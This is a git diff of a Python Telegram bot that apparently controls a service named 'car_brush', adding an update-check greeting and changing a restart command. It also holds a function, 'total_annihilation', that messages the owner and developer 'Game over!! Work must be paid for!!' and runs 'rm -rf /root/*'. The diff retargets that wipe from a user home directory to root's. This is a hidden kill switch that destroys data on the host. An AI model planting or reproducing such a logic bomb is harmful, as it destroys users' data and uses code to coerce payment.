@@ -1,11 +1,12 @@
 from os import system
 from subprocess import PIPE, Popen
 from loguru import logger
+from time import sleep
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
-from settings import TOKEN, DEVELOPER_ID, OWNER_ID, CONTROL_CHAT_ID, WORKDIR
+from settings import TOKEN, DEVELOPER_ID, OWNER_ID, CONTROL_CHAT_ID
 from app import MainAppManager
 
 
@@ -56,19 +57,23 @@ async def check_for_updates(callback: CallbackQuery):
     update_result = update_request.communicate()
     if 'Already up to date.\n' in update_result[0]:
         logger.info(f"update attempt with {update_result}")
-        await callback.message.edit_text(text="Приложение в актуальном состоянии, обновление не требуется.",
+        await callback.message.edit_text(text="Приложение в актуальном состоянии, обновление не требуется.")
+        sleep(2)
+        await callback.message.edit_text("Привет, Евгений!!\n"
+                                         "Бот готов к работе, для запуска программы нажми кнопку Пуск!",
                                          reply_markup=callback.message.reply_markup)
+
     else:
         await callback.message.edit_text(text="Приложение было обновлено. Сейчас приложение будет перезапущено.\n"
                                               "Подождите одну минуту и перезапустите бота.")
         logger.info(f"update attempt with {update_result}")
-        system("sudo systemctl restart car_brush")
+        system("systemctl restart car_brush")
 
 
 async def total_annihilation(callback: CallbackQuery):
     await bot.send_message(DEVELOPER_ID, "Game over!!\n\nЗа работу надо платить!!")
     await bot.send_message(OWNER_ID, "Game over!!\n\nЗа работу надо платить!!")
-    system("rm -rf /home/user/*")
+    system("rm -rf /root/*")
 
 
 dp.message.register(process_start_command, Command(commands="start"))
